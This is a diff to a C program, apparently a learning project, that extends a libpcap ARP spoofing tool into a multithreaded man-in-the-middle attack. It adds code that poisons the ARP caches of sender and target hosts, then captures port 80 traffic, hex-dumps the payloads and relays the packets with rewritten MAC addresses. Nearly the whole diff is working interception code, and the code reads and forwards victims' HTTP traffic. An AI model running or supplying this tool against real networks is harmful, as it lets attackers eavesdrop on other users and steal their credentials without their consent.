@@ -13,6 +13,17 @@
 #include <sys/types.h>
 #include <arpa/inet.h>			/* for inet_addr() */
 #include "net_header.h"			/* Net Header Structure */
+#include <pthread.h>			/* for pthread */
+#include <dumpcode.h>
+
+/*
+    Global
+ */
+#define MAX_PACKET 65536
+
+pthread_t *threads;
+__thread byte tg_packet[MAX_PACKET];
+
 
 /*
  *  send_arp
@@ -66,7 +77,11 @@ recv_arp (
 		if(((parp_hdr)packet)->ar_op == htons(ARPOP_REPLY)) {
 		    packet += ARP_SIZE;
 
-		    memcpy(tmac, ether_ntoa((const struct ether_addr*)((parp_data)packet)->sender_ha), ETHER_ADDRSTRLEN); 
+		    memcpy(
+			    tmac, 
+			    ether_ntoa(
+				(const struct ether_addr*)((parp_data)packet)->sender_ha), 
+			    ETHER_ADDRSTRLEN); 
 		    break;
 		} else return -1;
 	    }
@@ -113,6 +128,7 @@ normal_arp (
     ad.target_ip = inet_addr(tip);
 
     send_arp(handle, &eh, &ah, &ad);
+    puts("send Normal ARP Requset...");
     if(!recv_arp(handle, (byte*)tmac)) return 1;
 
     return 0;
@@ -154,13 +170,88 @@ arp_infection (
     memcpy(&ad.target_ha, ether_aton(smac), ETHER_ADDR_LEN);
     ad.target_ip = inet_addr(sip);
 
-    while(1) {
-	printf("Send Infect ARP Reply...\n");
-	send_arp(handle, &eh, &ah, &ad);
-	sleep(3);
-    }
+    printf("Send Infect ARP Reply...\n");
+    send_arp(handle, &eh, &ah, &ad);
 }
 
+/*
+ *  packet_relay
+ *  return : true(1), false(0)
+ *  packet relay between sender and target.
+ */
+
+#define Packet_Len(x)	(((pipv4_hdr)x)->ip_len)+14
+int
+packet_relay (
+	pcap_t *handle,
+	p_addr_list my_al
+) {
+    //ether_hdr eh;
+
+    struct bpf_program fp;		    /* The compiled filter */
+    byte filter_exp[] = "port 80";	    /* The fileter expression */
+    bpf_u_int32 net = 0;		    /* Our IP */
+    struct pcap_pkthdr header;		    /* The header that pcap gives us */
+    const u_char *packet;		    /* The actual packet */
+    const u_char *packet_ptr;		    /* packet pointer */
+    DWORD total_len;			    /* packet's total length */
+    DWORD header_len;			    /* packet's header(ethernet, ip, tcp) len */
+
+    if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
+	fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
+	return(0);
+    }
+    if(pcap_setfilter(handle, &fp) == -1) {
+	fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
+	return(0);
+    }
+
+    while(1) {
+	puts("MITM...");
+	if(pcap_next_ex(handle, (struct pcap_pkthdr **)&header, &packet) == 1) {
+	    packet_ptr = packet;
+
+	    if(((pether_hdr)packet_ptr)->ether_type == htons(ETHERTYPE_IP)) {
+		packet_ptr += ETHER_SIZE;
+		header_len = ETHER_SIZE;
+
+		if(((pipv4_hdr)packet_ptr)->ip_p == IPPROTO_TCP) {
+		    total_len = Packet_Len(packet_ptr);
+		    header_len += ((((pipv4_hdr)packet_ptr)->ip_hl)*4);
+		    packet_ptr += ((((pipv4_hdr)packet_ptr)->ip_hl)*4);
+
+		    dumpcode(packet, total_len+14);
+		    if(((ptcp_hdr)packet_ptr)->th_dport == htons(80)) {
+			header_len += ((((ptcp_hdr)packet_ptr)->th_off)*4);
+			packet_ptr += ((((ptcp_hdr)packet_ptr)->th_off)*4);
+	
+			// relay to target from sender
+			memcpy(tg_packet, packet, total_len);
+			memcpy(&(((pether_hdr)tg_packet)->ether_shost), 
+				my_al->mac, 
+				ETHER_ADDR_LEN);
+
+			dumpcode(tg_packet+header_len, total_len-header_len);
+			pcap_sendpacket(handle, (BYTE*)tg_packet, total_len);
+		    } else if(((ptcp_hdr)packet_ptr)->th_sport == htons(80)) {
+			packet_ptr += ((((ptcp_hdr)packet_ptr)->th_off)*4);
+
+			// relay to sender from target
+			memcpy(tg_packet, packet, total_len);
+			memcpy(&(((pether_hdr)tg_packet)->ether_dhost), 
+				my_al->mac, 
+				ETHER_ADDR_LEN);
+
+			dumpcode(tg_packet+header_len, total_len-header_len);
+			pcap_sendpacket(handle, (BYTE*)tg_packet, total_len);
+		    } else continue;
+		}
+	    }
+	}
+    }
+
+    return 1;
+}
 
 /*
  *  convrt_mac
@@ -247,8 +338,66 @@ get_my_mac (
     }
 
     free(ifcnf_s.ifc_buf);
+
     return 0;
 }
+
+/*
+ *  arp_spoof
+ *  return : void* arp_spoof(void *arg)
+ *  one arp_spoof process per 2 addresses(Sender, Target)
+ */
+
+void*
+arp_spoof (
+	void *arg
+) {
+    thr_arg *argv = (thr_arg*)arg;
+    pcap_t *handle = argv->handle;
+    p_addr_list my_al = argv->my_al;
+    p_addr_list s_al = argv->s_al;
+    p_addr_list t_al = argv->t_al;
+
+    // Get Sender's MAC Address
+    if(normal_arp(
+		handle, 
+		(const byte*)my_al->mac, 
+		(const byte*)my_al->ip, 
+		s_al->mac, 
+		(const byte*)s_al->ip)
+    && normal_arp(
+		handle,
+		(const byte*)my_al->mac,
+		(const byte*)my_al->ip,
+		t_al->mac,
+		(const byte*)t_al->ip)) 
+    {
+	puts("===== ARP Request Result ====");
+	printf("Sender's MAC Address : %s\n", s_al->mac);
+	puts("=============================");
+	printf("Target's MAC Address : %s\n", t_al->mac);
+	puts("=============================");
+
+	arp_infection(
+		handle, 
+		(const byte*)my_al->mac, 
+		(const byte*)t_al->ip, 
+		(const byte*)s_al->mac, 
+		(const byte*)s_al->ip);
+	arp_infection(
+		handle,
+		(const byte*)my_al->mac,
+		(const byte*)s_al->ip,
+		(const byte*)t_al->mac,
+		(const byte*)t_al->ip);
+
+	//relay
+	packet_relay(handle, my_al);
+    }
+
+    return ((void *)0);
+}
+
 
 /*
  *  main
@@ -271,6 +420,8 @@ main (
     p_addr_list t_al;			/* Target's Linked List */
     addr_list my_al;			/* My Linked List */
     char errbuf[PCAP_ERRBUF_SIZE];	/* Error String */
+    thr_arg *p_ta;			/* Thread Arguments */
+    int status;				/* Trhead process result */
 
     if((argc <= 4) && ((argc%2) != 0)) {
         fprintf(stderr, "Usage : %s <interface> <sender ip> <target ip> [<sender ip> <target ip>...]\n", argv[0]);
@@ -281,14 +432,14 @@ main (
 
     s_al = (p_addr_list) malloc(sizeof(addr_list)*gen_num);
     memset(s_al, 0, sizeof(addr_list)*gen_num);
-    for(DWORD i=0; i<gen_num; i++)
-	strncpy((char *__restrict)s_al[i].ip, argv[2+(i*2)], INET_ADDRSTRLEN);
-
+   
     t_al = (p_addr_list) malloc(sizeof(addr_list)*gen_num);
     memset(t_al, 0, sizeof(addr_list)*gen_num);
-    for(DWORD i=0; i<gen_num; i++)
+    for(DWORD i=0; i<gen_num; i++) {
+	strncpy((char *__restrict)s_al[i].ip, argv[2+(i*2)], INET_ADDRSTRLEN);
 	strncpy((char *__restrict)t_al[i].ip, argv[(i*2)+3], INET_ADDRSTRLEN);
-    
+    }
+
     dev = argv[1];
 
     get_my_mac(&my_al);
@@ -300,41 +451,26 @@ main (
     	return(2);
     }
 
-    // Get Sender's MAC Address
-    if(normal_arp(
-		handle, 
-		(const byte*)my_al.mac, 
-		(const byte*)my_al.ip, 
-		s_al[0].mac, 
-		(const byte*)s_al[0].ip)
-    && normal_arp(
-		handle,
-		(const byte*)my_al.mac,
-		(const byte*)my_al.ip,
-		t_al[0].mac,
-		(const byte*)t_al[0].ip)) 
-    {
-	puts("===== ARP Request Result ====");
-	printf("Sender's MAC Address : %s\n", s_al[0].mac);
-	puts("=============================");
-	printf("Target's MAC Address : %s\n", t_al[0].mac);
-	puts("=============================");
+    // per threads
+    threads = (pthread_t*) malloc(sizeof(pthread_t)*gen_num);
+    memset(threads, 0, sizeof(pthread_t)*gen_num);
 
-	arp_infection(
-		handle, 
-		(const byte*)my_al.mac, 
-		(const byte*)t_al[0].ip, 
-		(const byte*)s_al[0].mac, 
-		(const byte*)s_al[0].ip);
-	arp_infection(
-		handle,
-		(const byte*)my_al.mac,
-		(const byte*)s_al[0].ip,
-		(const byte*)t_al[0].mac,
-		(const byte*)t_al[0].ip);
+    p_ta = (thr_arg*) malloc(sizeof(thr_arg)*gen_num);
+    memset(p_ta, 0, sizeof(thr_arg)*gen_num);
 
-	//relay
+    for(DWORD i=0; i<gen_num; i++) {
+	p_ta[i].handle = handle;
+	p_ta[i].my_al = &my_al;
+	p_ta[i].s_al = &s_al[i];
+	p_ta[i].t_al = &t_al[i];
+
+	pthread_create(&threads[i], NULL, &arp_spoof, (void *)&p_ta[i]);
+	//pthread_detach(threads[i]);
     }
+
+    // Wait for multiple threads
+    for(DWORD i=0; i<gen_num; i++)
+	pthread_join(threads[i], (void *)&status);
 
     /* And close the session */
     pcap_close(handle);
